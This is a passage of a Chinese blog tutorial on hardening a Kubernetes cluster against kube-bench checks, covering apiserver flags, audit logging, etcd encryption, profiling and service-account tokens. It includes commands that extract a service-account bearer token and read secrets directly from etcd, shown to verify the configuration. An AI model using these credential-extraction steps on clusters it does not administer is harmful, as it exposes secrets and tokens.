class=\"headerlink\" title=\"anonymous-auth\"></a>anonymous-auth</h4><p>设置为true时候，如果一个请求没被别的验证流程拦截，那么这个请求就作为一个匿名请求，比如你不提供token的时候（不同于提供错误的token）。匿名请求的用户名和组分别为 <code>system:anonymous</code>和<code>system:unauthenticated</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/authentication/#anonymous-requests</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/kubernetes/manifests/kube-apiserver.yaml 中添加参数</span><br><span class=\"line\">--anonymous-auth=false</span><br><span class=\"line\"></span><br><span class=\"line\">但设为true不是必须的，设置了会影响health check。</span><br><span class=\"line\">If you are using RBAC authorization, it is generally considered reasonable to allow anonymous access to the API Server for health checks and discovery purposes, and hence this recommendation is not scored. However, you should consider whether anonymous discovery is an acceptable risk for your purposes.</span><br><span class=\"line\"></span><br><span class=\"line\">设为false可能会引起问题:</span><br><span class=\"line\">https://github.com/kubernetes/kubeadm/issues/798#issuecomment-470579937</span><br><span class=\"line\">https://github.com/kubernetes/kubernetes/issues/51076#issuecomment-412846482</span><br><span class=\"line\">so leave anonymous-auth=true(default value) with RBAC is ok.</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"kubelet-certificate-authority\"><a href=\"#kubelet-certificate-authority\" class=\"headerlink\" title=\"kubelet-certificate-authority\"></a>kubelet-certificate-authority</h4><p>在默认的时候，apiserver访问kubelet的时候，当然，会走ssl验证，但是只会做单向验证，也就是kubelet会验证apiserver，apiserver不会验证kubelet的身份。kubelet-certificate-authority被设置的时候，apiserver访问kubelet时，apiserver就会验证kubelet的身份，并使用kubelet-certificate-authority配置的CA文件来验证。这里我们使用与集群相同的ca文件（default at /etc/kubernetes/pki/ca.crt）来创建kubelet server的证书：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">首先给kubelet server2创建证书：</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; 1. 创建csr配置文件</span><br><span class=\"line\">vi kubelet-server2.conf</span><br><span class=\"line\"></span><br><span class=\"line\">[ req ]</span><br><span class=\"line\">default_bits = 2048</span><br><span class=\"line\">prompt = no</span><br><span class=\"line\">default_md = sha256</span><br><span class=\"line\">req_extensions = req_ext</span><br><span class=\"line\">distinguished_name = dn</span><br><span class=\"line\"></span><br><span class=\"line\">[ dn ]</span><br><span class=\"line\">O = system:nodes</span><br><span class=\"line\">CN = system:node:server2</span><br><span class=\"line\"></span><br><span class=\"line\">[ req_ext ]</span><br><span class=\"line\">subjectAltName = @alt_names</span><br><span class=\"line\"></span><br><span class=\"line\">[ alt_names ]</span><br><span class=\"line\">DNS.1 = server2</span><br><span class=\"line\">IP.1 = 192.168.3.152</span><br><span class=\"line\"></span><br><span class=\"line\">[ v3_ext ]</span><br><span class=\"line\">authorityKeyIdentifier=keyid,issuer:always</span><br><span class=\"line\">basicConstraints=CA:FALSE</span><br><span class=\"line\">keyUsage=keyEncipherment,dataEncipherment</span><br><span class=\"line\">extendedKeyUsage=serverAuth</span><br><span class=\"line\">subjectAltName=@alt_names</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; 2. 创建server证书</span><br><span class=\"line\"># 创建key</span><br><span class=\"line\">openssl genrsa -out kubelet-server2.key 2048</span><br><span class=\"line\"># 创建csr</span><br><span class=\"line\">openssl req -new -key kubelet-server2.key -out kubelet-server2.csr -config kubelet-server2.conf</span><br><span class=\"line\"># 创建crt</span><br><span class=\"line\">openssl x509 -req -in kubelet-server2.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out kubelet-server2.crt -days 366 -extensions v3_ext -extfile kubelet-server2.conf</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; 3. copy files to server2</span><br><span class=\"line\">scp -P 22 kubelet-server2* root@192.168.3.152:/var/lib/kubelet/pki/</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; 4. config kubelet config file</span><br><span class=\"line\">vi /var/lib/kubelet/config.yaml # add below two</span><br><span class=\"line\"># tlsCertFile: /var/lib/kubelet/pki/kubelet-server2.crt</span><br><span class=\"line\"># tlsPrivateKeyFile: /var/lib/kubelet/pki/kubelet-server2.key</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; 5. config apiserver command line</span><br><span class=\"line\">vi /etc/kubernetes/manifests/kube-apiserver.yaml # add below one</span><br><span class=\"line\"># - --kubelet-certificate-authority=/etc/kubernetes/pki/ca.crt</span><br></pre></td></tr></table></figure>\n\n<p>注意上面的流程中既包含apiserver的参数kubelet-certificate-authority，也包含kubelet需要配置的参数tlsCertFile和tlsPrivateKeyFile。</p>\n<p>经过验证，如果kubelet使用全新的ca来签名（而不是当前集群使用的CA），然后把全新的这个ca的cert配到apiserver的–kubelet-certificate-authority，这时候apiserver请求kubelet会出现unknown ca的错误，不成功，应该是这个全新ca还没有添加到apiserver的可信ca中。这个方向没有继续探索。</p>\n<h4 id=\"admission-control-EventRateLimit\"><a href=\"#admission-control-EventRateLimit\" class=\"headerlink\" title=\"admission-control EventRateLimit\"></a>admission-control EventRateLimit</h4><p>admission-control是apiserver提供的一系列内置的控制插件，可以拦截和修改请求。</p>\n<p>eventratelimit是用来控制请求的qps的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#eventratelimit</span><br><span class=\"line\"></span><br><span class=\"line\">总体步骤是：</span><br><span class=\"line\">先创建好配置文件admission-control-config-file.yaml和eventconfig.yaml，然后修改kube-apiserver.yaml</span><br><span class=\"line\"></span><br><span class=\"line\"># 创建配置文件存放的目录</span><br><span class=\"line\">sudo mkdir /etc/kubernetes/admission/</span><br><span class=\"line\">cd /etc/kubernetes/admission/</span><br><span class=\"line\"></span><br><span class=\"line\"># 配置admission-control-config-file.yaml，总的插件配置文件</span><br><span class=\"line\">/etc/kubernetes/admission$ sudo vi admission-control-config-file.yaml</span><br><span class=\"line\">apiVersion: apiserver.config.k8s.io/v1</span><br><span class=\"line\">kind: AdmissionConfiguration</span><br><span class=\"line\">plugins:</span><br><span class=\"line\">- name: EventRateLimit</span><br><span class=\"line\">  path: eventconfig.yaml</span><br><span class=\"line\"></span><br><span class=\"line\"># 配置eventconfig.yaml</span><br><span class=\"line\"># burst是令牌桶的桶大小，cacheSize是指LRU中最多存放多少个namespace/user的配置值</span><br><span class=\"line\">/etc/kubernetes/admission$ sudo vi eventconfig.yaml </span><br><span class=\"line\">apiVersion: eventratelimit.admission.k8s.io/v1alpha1</span><br><span class=\"line\">kind: Configuration</span><br><span class=\"line\">limits:</span><br><span class=\"line\">- type: Namespace</span><br><span class=\"line\">  qps: 50</span><br><span class=\"line\">  burst: 100</span><br><span class=\"line\">  cacheSize: 2000</span><br><span class=\"line\">- type: User</span><br><span class=\"line\">  qps: 10</span><br><span class=\"line\">  burst: 50</span><br><span class=\"line\">  cacheSize: 1000</span><br><span class=\"line\"></span><br><span class=\"line\"># 配置kube-apiserver.yaml</span><br><span class=\"line\"># enable-admission-plugins参数打开EventRateLimit项，</span><br><span class=\"line\"># admission-control-config-file参数配置总的插件配置文件</span><br><span class=\"line\"># mount created new directory</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/kubernetes/manifests$ sudo vi kube-apiserver.yaml</span><br><span class=\"line\"># edit two lines</span><br><span class=\"line\">- --enable-admission-plugins=NodeRestriction,EventRateLimit</span><br><span class=\"line\">- --admission-control-config-file=/etc/kubernetes/admission/admission-control-config-file.yaml</span><br><span class=\"line\"></span><br><span class=\"line\"># add</span><br><span class=\"line\">- mountPath: /etc/kubernetes/admission</span><br><span class=\"line\">  name: api-admission</span><br><span class=\"line\">  readOnly: true</span><br><span class=\"line\"></span><br><span class=\"line\"># add</span><br><span class=\"line\">- hostPath:</span><br><span class=\"line\">    path: /etc/kubernetes/admission</span><br><span class=\"line\">    type: DirectoryOrCreate</span><br><span class=\"line\">  name: api-admission</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"admission-control-AlwaysPullImages\"><a href=\"#admission-control-AlwaysPullImages\" class=\"headerlink\" title=\"admission-control AlwaysPullImages\"></a>admission-control AlwaysPullImages</h4><p>同样是一个admission-control插件，会强制把pod中的imagePullPolicy改成Always，这么做是为了防止没有镜像拉取权限的用户利用已经缓存在本地的镜像来拉起pod。镜像拉取权限可以通过在pod中指定<a href=\"https://kubernetes.io/zh/docs/tasks/configure-pod-container/pull-image-private-registry/\">imagePullSecrets</a>来指定访问registry的用户名密码，如果不配置成Always，那么一个没有registry拉取权限的用户就可能利用缓存的镜像而运行了。</p>\n<p>这个插件的逻辑比较简单，就是把imagePullPolicy强制改成Always。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考文档：</span><br><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#alwayspullimages </span><br><span class=\"line\">https://trstringer.com/kubernetes-alwayspullimages/</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"admission-control-SecurityContextDeny\"><a href=\"#admission-control-SecurityContextDeny\" class=\"headerlink\" title=\"admission-control SecurityContextDeny\"></a>admission-control SecurityContextDeny</h4><p>同样是一个admission-control插件,开启后会禁止SecurityContext中的部分字段，但并不是禁止securitycontext中的所有字段。开了PodSecurityPolicy插件的话这个就不需要开启。kube-bench对SecurityContextDeny和PodSecurityPolicy只要有一个开了就不会报了，不过PodSecurityPolicy比SecurityContextDeny要复杂很多。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">开启后会禁止SecurityContext中的RunAsUser等字段,pod级别的和container级别的都有字段会涉及.</span><br><span class=\"line\">代码在plugin/pkg/admission/securitycontext/scdeny/admission.go</span><br><span class=\"line\">// Validate will deny any pod that defines SupplementalGroups, SELinuxOptions, RunAsUser or FSGroup</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"admission-control-PodSecurityContext\"><a href=\"#admission-control-PodSecurityContext\" class=\"headerlink\" title=\"admission-control PodSecurityContext\"></a>admission-control PodSecurityContext</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">禁止SecirityContex中的一些字段,但是这个PodSecurityContext已经被deprecated了.</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"insecure-port\"><a href=\"#insecure-port\" class=\"headerlink\" title=\"insecure port\"></a>insecure port</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">insecure-bind-address, insecure-port, port</span><br><span class=\"line\">apiserver这几个参数都已经废除,并且不会再被使用了. 所以这几个参数不用管。</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"profiling\"><a href=\"#profiling\" class=\"headerlink\" title=\"profiling\"></a>profiling</h4><p>–profiling=false</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">这个是关闭pprof页面. 如果需要这个页面就不要关闭,然后通过下面的步骤查看:</span><br><span class=\"line\"></span><br><span class=\"line\">:~# kubectl proxy</span><br><span class=\"line\">Starting to serve on 127.0.0.1:8001</span><br><span class=\"line\"></span><br><span class=\"line\">:~# wget http://127.0.0.1:8001/debug/pprof</span><br><span class=\"line\"></span><br><span class=\"line\">apiserver scheduler controller-manager都可以关闭。</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"audit-policy-file\"><a href=\"#audit-policy-file\" class=\"headerlink\" title=\"audit-policy-file\"></a>audit-policy-file</h4><p>审计功能就是给请求记录日志，不同的请求可以设置不同的日志级别，比如只记录metadata，只记录request，等等。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考：</span><br><span class=\"line\">https://kubernetes.io/docs/tasks/debug-application-cluster/audit/</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&gt;&gt; 1. 创建audit-policy.yaml</span></span><br><span class=\"line\">vi /etc/kubernetes/audit-policy.yaml</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 简单版的policy</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Log all requests at the Metadata level.</span></span><br><span class=\"line\">apiVersion: audit.k8s.io/v1</span><br><span class=\"line\">kind: Policy</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- level: Metadata</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&gt;&gt; 2. 配置apiserver参数</span></span><br><span class=\"line\">    - --audit-policy-file=/etc/kubernetes/audit-policy.yaml</span><br><span class=\"line\">    - --audit-log-path=/var/log/kubernetes/audit/audit.log</span><br><span class=\"line\">    - --audit-log-maxage=15</span><br><span class=\"line\">    - --audit-log-maxbackup=10</span><br><span class=\"line\">    - --audit-log-maxsize=10</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&gt;&gt; 3. 挂载相关文件和目录</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\">volumeMounts:</span></span><br><span class=\"line\">    - mountPath: /etc/kubernetes/audit-policy.yaml</span><br><span class=\"line\">      name: audit-policy</span><br><span class=\"line\">      readOnly: true</span><br><span class=\"line\">    - mountPath: /var/log/kubernetes/audit</span><br><span class=\"line\">      name: audit-log</span><br><span class=\"line\">      readOnly: false</span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\">volumes:</span></span><br><span class=\"line\">  - hostPath:</span><br><span class=\"line\">      path: /etc/kubernetes/audit-policy.yaml</span><br><span class=\"line\">      type: File</span><br><span class=\"line\">    name: audit-policy</span><br><span class=\"line\">  - hostPath:</span><br><span class=\"line\">      path: /var/log/kubernetes/audit</span><br><span class=\"line\">      type: DirectoryOrCreate</span><br><span class=\"line\">    name: audit-log</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>之后你在/var/log/kubernetes/audit/audit.log文件中就能看到apiserver的请求日志了。</p>\n<h4 id=\"encryption-provider-config\"><a href=\"#encryption-provider-config\" class=\"headerlink\" title=\"encryption-provider-config\"></a>encryption-provider-config</h4><p>对写入etcd的数据进行编码，对读取的数据进行解码，这样用户直接读etcd的数据就会是乱码。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考：</span><br><span class=\"line\">https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/</span><br><span class=\"line\"></span><br><span class=\"line\">因为我们在”admission-control EventRateLimit“小节已经挂载了/etc/kubernetes/admission目录，所以这里不再配置挂载/etc/kubernetes/admission的操作。</span><br><span class=\"line\"></span><br><span class=\"line\">编辑encrypt-config.yaml文件：</span><br><span class=\"line\">vi /etc/kubernetes/admission/encrypt-config.yaml</span><br><span class=\"line\">apiVersion: apiserver.config.k8s.io/v1</span><br><span class=\"line\">kind: EncryptionConfiguration</span><br><span class=\"line\">resources:</span><br><span class=\"line\">  - resources:</span><br><span class=\"line\">    - secrets</span><br><span class=\"line\">    providers:</span><br><span class=\"line\">    - aescbc:</span><br><span class=\"line\">        keys:</span><br><span class=\"line\">        - name: key1</span><br><span class=\"line\">          secret: &lt;BASE 64 ENCODED SECRET&gt;</span><br><span class=\"line\">    - identity: &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">其中secret通过</span><br><span class=\"line\">head -c 32 /dev/urandom | base64</span><br><span class=\"line\">获取。集群内用来HA的多个apiserver要用同一个secret。</span><br><span class=\"line\"></span><br><span class=\"line\">然后通过--encryption-provider-config参数传给apiserver。</span><br><span class=\"line\">--encryption-provider-config=/etc/kubernetes/admission/encrypt-config.yaml</span><br></pre></td></tr></table></figure>\n\n<p>注意providers下的项目中，第一个provider的项用于加密，所有providers项用于依次解密。在我们的配置中key1用于加密，解密会先用key1解，解不出就用第二项解，第二项是空的，也就是原样返回。通常providers最后一项配为空，这样就可以防止在encrypt-config.yaml应用前存入的不加密数据会读不出来。</p>\n<p>我们可以验证一下EncryptionConfiguration的功能：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 首先创建一个读etcd的脚本，方便操作：</span></span><br><span class=\"line\">vi read_etcd_resource.sh </span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"variable\">$1</span> resource</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"variable\">$2</span> namespace</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"variable\">$3</span> resource name</span></span><br><span class=\"line\">ETCDCTL_API=3 etcdctl --endpoints 127.0.0.1:2379 \\</span><br><span class=\"line\">  --cert=/etc/kubernetes/pki/etcd/server.crt \\</span><br><span class=\"line\">  --key=/etc/kubernetes/pki/etcd/server.key \\</span><br><span class=\"line\">  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\</span><br><span class=\"line\">  get /registry/$1/$2/$3</span><br><span class=\"line\"><span class=\"meta\">  </span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 验证encrypt的方法：</span></span><br><span class=\"line\">kubectl get secret</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 选择一个encrypt-config.yaml应用前已经存在的secre，比如tdefault-token-xxxxx</span></span><br><span class=\"line\">sh etcd_read.sh secrets default default-token-xxxxx</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 返回可读明文。</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 创建一个新的secret</span></span><br><span class=\"line\">kubectl create secret generic xx --from-literal aa==bb</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 读取先的secret</span></span><br><span class=\"line\">sh etcd_read.sh secrets default xx</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 返回乱码，证明新建的secret已经被encode了</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"tls-cipher-suites\"><a href=\"#tls-cipher-suites\" class=\"headerlink\" title=\"tls-cipher-suites\"></a>tls-cipher-suites</h4><p>设置tls支持的加密算法，由于部分加密算法是不安全的，所以我们需要把支持的加密算法枚举出来，不安全的不枚举就不会被使用。枚举出的算法名配到tls-cipher-suites即可。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考：</span><br><span class=\"line\">https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/</span><br><span class=\"line\">--tls-cipher-suites strings              Comma-separated list of cipher</span><br><span class=\"line\"> suites for the server. If omitted, the default Go cipher suites will be</span><br><span class=\"line\"> used.</span><br><span class=\"line\">有部分算法是不够安全的。不传的话是使用的默认算法列表，取决于tls内部，默认值不是k8s指定的。</span><br><span class=\"line\"></span><br><span class=\"line\">上面kubernetes文档里有给出建议的选项(要删掉空格)。</span><br><span class=\"line\">Comma-separated list of cipher suites for the server. If omitted, the default Go cipher suites will be used.</span><br><span class=\"line\">Preferred values: TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256, TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA, TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA, TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305, TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256, TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA, TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305, TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256, TLS_RSA_WITH_AES_128_CBC_SHA, TLS_RSA_WITH_AES_128_GCM_SHA256, TLS_RSA_WITH_AES_256_CBC_SHA, TLS_RSA_WITH_AES_256_GCM_SHA384.</span><br><span class=\"line\">Insecure values: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256, TLS_ECDHE_ECDSA_WITH_RC4_128_SHA, TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA, TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256, TLS_ECDHE_RSA_WITH_RC4_128_SHA, TLS_RSA_WITH_3DES_EDE_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA256, TLS_RSA_WITH_RC4_128_SHA.</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"request-timeout\"><a href=\"#request-timeout\" class=\"headerlink\" title=\"request-timeout\"></a>request-timeout</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">文档：</span><br><span class=\"line\">https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/</span><br><span class=\"line\"></span><br><span class=\"line\">--request-timeout表示apiserver可以维持一个链接直到超时的时间。</span><br><span class=\"line\">比如--request-timeout=300s。</span><br><span class=\"line\"></span><br><span class=\"line\">还有个--min-request-timeout，专用于watch request handler的超时时间，</span><br><span class=\"line\">实际超时时间是在min-request-timeout之上加一个随机值。</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"controller-manager配置参数\"><a href=\"#controller-manager配置参数\" class=\"headerlink\" title=\"controller manager配置参数\"></a>controller manager配置参数</h3><h4 id=\"terminated-pod-gc-threshold\"><a href=\"#terminated-pod-gc-threshold\" class=\"headerlink\" title=\"terminated-pod-gc-threshold\"></a>terminated-pod-gc-threshold</h4><p>已经结束的pod（succeed和failed）不会自动删除，直到某个控制器删除或者手动删除。</p>\n<p>–terminated-pod-gc-threshold配置后，当超过配置值数量pod结束后，就会触发清理，超过几个就清理几个。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">文档：</span><br><span class=\"line\">https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#pod-garbage-collection</span><br><span class=\"line\"></span><br><span class=\"line\">代码在pkg/controller/podgc/gc_controller.go 的 func (gcc *PodGCController) gcTerminated(pods []*v1.Pod)</span><br><span class=\"line\"></span><br><span class=\"line\">The control plane cleans up terminated Pods (with a phase of Succeeded or Failed), when the number of Pods exceeds the configured threshold (determined by terminated-pod-gc-threshold in the kube-controller-manager).</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"profiling-1\"><a href=\"#profiling-1\" class=\"headerlink\" title=\"profiling\"></a>profiling</h4><p>在apiserver中我们已经禁用了apiserver的profiling，那么相应的controller manager的profiling也应该被禁用掉。给controller manager配置命令行参数–profiling=false即可。</p>\n<p>不过这里要补充一个知识，如何在controller manager的profiling打开的情况下，查看pprof页面。思路是在请求中带上TOKEN，并且给token对应的用户一个对应的权限。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># get default user token</span><br><span class=\"line\">kubectl describe secret $(kubectl get secrets -n default | grep ^default | cut -f1 -d &#x27; &#x27;) -n default | grep -E &#x27;^token&#x27; | cut -f2 -d&#x27;:&#x27; | tr -d &quot; &quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># set token var</span><br><span class=\"line\">TOKEN=xxx  # 上一条命令的内容</span><br><span class=\"line\"></span><br><span class=\"line\"># apply clusterrolebinding</span><br><span class=\"line\">kl apply -f role.yaml</span><br><span class=\"line\"></span><br><span class=\"line\"># 访问带上token</span><br><span class=\"line\">curl https://127.0.0.1:10257/debug/pprof/goroutine?debug=2 -k --header &quot;Authorization: Bearer $TOKEN&quot;</span><br><span class=\"line\">curl https://127.0.0.1:10259/debug/pprof/goroutine?debug=2 -k --header &quot;Authorization: Bearer $TOKEN&quot;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 其中role.yaml内容如下：</span><br><span class=\"line\"></span><br><span class=\"line\">cat role.yaml</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRole</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: debug-cluster-role</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- nonResourceURLs:</span><br><span class=\"line\">  - /debug/pprof/profile</span><br><span class=\"line\">  - /debug/pprof/goroutine</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - get</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: ClusterRoleBinding</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: debug-binding</span><br><span class=\"line\">roleRef:</span><br><span class=\"line\">  apiGroup: rbac.authorization.k8s.io</span><br><span class=\"line\">  kind: ClusterRole</span><br><span class=\"line\">  name: debug-cluster-role</span><br><span class=\"line\">subjects:</span><br><span class=\"line\">- kind: ServiceAccount</span><br><span class=\"line\">  name: default</span><br><span class=\"line\">  namespace: default</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"scheduller配置参数\"><a href=\"#scheduller配置参数\" class=\"headerlink\" title=\"scheduller配置参数\"></a>scheduller配置参数</h3><h4 id=\"profiling-2\"><a href=\"#profiling-2\" class=\"headerlink\" title=\"profiling\"></a>profiling</h4><p>同apiserver和controll manager,配置命令行参数–profiling=false即可。</p>\n<h2 id=\"automountServiceAccountToken\"><a href=\"#automountServiceAccountToken\" class=\"headerlink\" title=\"automountServiceAccountToken\"></a>automountServiceAccountToken</h2><p>我们创建pod的时候会自动挂载一个user，默认就是default，这个用户的token会挂载在/var/run/secrets/kubernetes.io/serviceaccount/token下，但是出于安全考虑，我们希望不要被自动挂载。</p>\n<p>pod和service account都可以设置automountServiceAccountToken这个字段，都设置了的话pod中的automountServiceAccountToken字段优先。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server</span><br><span class=\"line\"></span><br><span class=\"line\"># sa中配置</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: ServiceAccount</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: build-robot</span><br><span class=\"line\">automountServiceAccountToken: false</span><br><span class=\"line\"></span><br><span class=\"line\"># pod中配置</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Pod</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: my-pod</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  serviceAccountName: build-robot</span><br><span class=\"line\">  automountServiceAccountToken: false</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"secret管理\"><a href=\"#secret管理\" class=\"headerlink\" title=\"secret管理\"></a>secret管理</h2><p>secret可以挂载到env或者volume中，但是由于环境变量容易暴露到日志中，因此secret应该尽量使用volume挂载而不是env。</p>\n<p>secret如果有更复杂的管理，或者需要跨k8s或者在非k8s环境下使用，还是需要进行外部管理的。</p>\n<h2 id=\"seccomp-default\"><a href=\"#seccomp-default\" class=\"headerlink\" title=\"seccomp default\"></a>seccomp default</h2><p>seccomp是操作系统用来限制进程的syscall的，k8s可以配置seccomp来限制容器中进程的syacall权限，哪些能call哪些不能call。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">文档：</span><br><span class=\"line\">https://kubernetes.io/blog/2021/08/25/seccomp-default/</span><br><span class=\"line\">https://kubernetes.io/docs/reference/command-line-tools-reference/feature-gates/</span><br><span class=\"line\"></span><br><span class=\"line\">默认情况下k8s传给cri的seccomp是Unconfined，即不限制syscall。</span><br><span class=\"line\">设置SeccompDefault后，会使用cri默认的seccomp，不同cri可能默认是不同的。</span><br><span class=\"line\">If not specified differently in the pod manifest, then the feature will add a higher set of security constraints by using the default profile of the container runtime. </span><br><span class=\"line\">These profiles may differ between runtimes like CRI-O or containerd. They also differ for its used hardware architectures</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们使用下面的步骤也验证seccomp default生效了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 获取目前的seccomp</span><br><span class=\"line\">kl run ng --image nginx --restart=Never</span><br><span class=\"line\">CONTAINER_ID=$(sudo crictl --runtime-endpoint=/run/containerd/containerd.sock ps -q --name=ng)</span><br><span class=\"line\">sudo crictl --runtime-endpoint=/run/containerd/containerd.sock inspect $CONTAINER_ID | jq .info.runtimeSpec.linux.seccomp</span><br><span class=\"line\"># 返回null</span><br><span class=\"line\"></span><br><span class=\"line\"># 配置seccomp default</span><br><span class=\"line\">root@k8sserver2:~# vi /etc/default/kubelet </span><br><span class=\"line\">KUBELET_EXTRA_ARGS=&quot;--feature-gates=&#x27;SeccompDefault=true&#x27; --seccomp-default=RuntimeDefault&quot;</span><br><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl restart kubelet</span><br><span class=\"line\"></span><br><span class=\"line\"># 获取新的seccomp</span><br><span class=\"line\">kl run gn --image nginx --restart=Never</span><br><span class=\"line\">CONTAINER_ID=$(sudo crictl 